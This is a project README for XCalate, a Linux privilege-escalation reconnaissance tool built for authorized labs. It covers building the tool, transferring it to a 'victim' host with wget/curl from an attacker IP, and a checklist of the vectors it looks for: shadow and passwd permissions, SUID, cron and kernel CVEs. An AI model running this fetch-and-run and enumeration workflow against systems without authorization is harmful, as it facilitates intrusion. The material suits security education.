# 🚀 XCalate
A lightweight privilege escalation reconnaissance tool inspired by TryHackMe labs.  

XCalate performs a series of quick checks (not exhaustive) to surface potential privilege-escalation vectors on Linux targets.

> **Note:** This tool is intended for authorized security assessments and educational labs only. 
> ⚠️ Do **not** run against systems you do not own or have explicit permission to test.


# ⚙️ Installation

>Tested with go version go1.24.0
1. `git clone https://github.com/7imbitz/XCalate.git`
2. `cd XCalate`

_Build_

3. Send `uname -m` command inside target

<center>

|`uname -m`| Meaning | `GOARCH`| Command |
|---|---|---|---|
|x86_64, amd64|64-bit Intel/AMD| `amd64`| `env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o XCalate cmd/main.go`|
|i686, i386|32-bit x86|`386`| `env CGO_ENABLED=0 GOOS=linux GOARCH=386 go build -o XCalate cmd/main.go`|
|aarch64|64-bit ARM|`arm64`| `env CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -o XCalate cmd/main.go`|
|armv7l, armv6l|32-bit ARM|`arm`| `env CGO_ENABLED=0 GOOS=linux GOARCH=arm go build -o XCalate cmd/main.go`|

</center>

4. Transfer the binary to the victim machine

```bash
#host
sudo python3 -m http.server 80 
#victim
`wget 10.10.10.10/XCalate` OR `curl http://10.10.10.10/XCalate -o XCalate`
chmod +x XCalate
./XCalate
```

# 📋 Checklist

In the meantime it checks for 
- Linux
    - ✅ Possible Service Exploits
    - ✅ Weak File Permissions
        - ✅ /etc/shadow - Readable & Writable
        - ✅ /etc/passwd - Writable
    - ✅ Sudo - Shell Escape Sequences
    - ✅ SUID Executable
    - ✅ [Capability](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
    - ✅ Cron Jobs
        - ✅ Overwrite custom cronjob - Writable
        - ✅ Check user's path inside the file
        - ✅ Usage of wildcards in cronjob
    - ✅ History
    - ✅ .ssh
    - ✅ Kernel check for 
        - ✅ CVE-2021-3493
        - ✅ [CVE-2022-0847](https://www.hackingarticles.in/linux-privilege-escalation-dirtypipe-cve-2022-0847/)
        - 👷🏻‍♂️ [CVE-2021-4034](https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/)
            - `ls -l /usr/bin/pkexec`
            - `stat -c "%A %U %G %n" /usr/bin/pkexec`
            - cross-check OS
        - ✅ [CVE-2021-3560](https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/)
            - Any system running polkit version < 0.119 is vulnerable to privilege escalation through this method

- Window
    - To be continued...


# 📖 Reference

- https://tryhackme.com/r/room/linuxprivesc
    - https://tryhackme.com/7imbitz/badges/linux-privesc     
- https://tryhackme.com/r/room/windows10privesc